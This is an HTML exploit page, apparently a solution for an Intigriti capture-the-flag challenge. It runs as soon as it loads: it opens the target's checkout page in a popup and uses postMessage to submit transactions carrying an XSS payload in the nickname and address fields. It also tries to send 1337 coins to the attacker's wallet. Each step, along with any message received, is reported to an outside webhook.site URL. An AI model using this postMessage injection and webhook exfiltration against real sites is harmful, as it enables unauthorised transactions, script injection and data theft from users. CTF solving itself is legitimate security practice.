<!DOCTYPE html>
<html>
<head>
    <title>XSS Exploit</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        #log {
            background: #111;
            border: 1px solid #333;
            padding: 15px;
            max-width: 700px;
            width: 100%;
            margin-top: 20px;
            font-size: 12px;
            line-height: 1.6;
        }
        .success { color: #00ffff; }
        .error { color: #ff4444; }
        .info { color: #ffaa00; }
    </style>
</head>
<body>
    <h1>EXPLOIT LOADED</h1>
    <div id="log">Initializing...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

        const logDiv = document.getElementById('log');

        function log(msg, className = '') {
            const timestamp = new Date().toLocaleTimeString();
            logDiv.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span><br>`;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        async function executeExploit() {
            log('Starting XSS exploit...', 'info');
            track('start', 'admin_visited_exploit', { wallet: YOUR_WALLET });

            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1`;
            log('Opening checkout popup...', 'info');

            const popup = window.open(checkoutUrl, 'checkout', 'width=1000,height=800');

            if (!popup) {
                log('ERROR: Popup blocked!', 'error');
                track('error', 'popup_blocked', {});
                return;
            }

            log('Popup opened', 'success');
            track('popup_opened', 'success', {});

            // Wait for popup to load wallets
            setTimeout(() => {
                log('Sending transaction with XSS in nickname...', 'info');

                // Send transaction - API might accept nickname even if checkout.html doesn't send it
                popup.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337,
                        nickname: XSS_PAYLOAD  // Try including it
                    }
                }, '*');

                track('tx_sent', 'xss_injected', { payload: XSS_PAYLOAD });

                // Also try with XSS in address field
                setTimeout(() => {
                    log('Trying XSS in toAddress field...', 'info');
                    popup.postMessage({
                        type: 'submitTransaction',
                        transaction: {
                            toAddress: XSS_PAYLOAD,
                            currency: '1337COIN',
                            amount: 1337
                        }
                    }, '*');
                    track('tx2_sent', 'xss_in_address', {});
                }, 500);

                log('Exploit complete!', 'success');
                track('complete', 'done', {});

            }, 5000);

            // Close popup after delay
            setTimeout(() => {
                if (popup && !popup.closed) {
                    popup.close();
                    log('Popup closed', 'info');
                }
            }, 8000);
        }

        window.addEventListener('message', (event) => {
            log('Message: ' + JSON.stringify(event.data), 'info');
            track('popup_message', 'received', { data: event.data });
        });

        window.addEventListener('load', () => {
            setTimeout(executeExploit, 500);
        });
    </script>
</body>
</html>
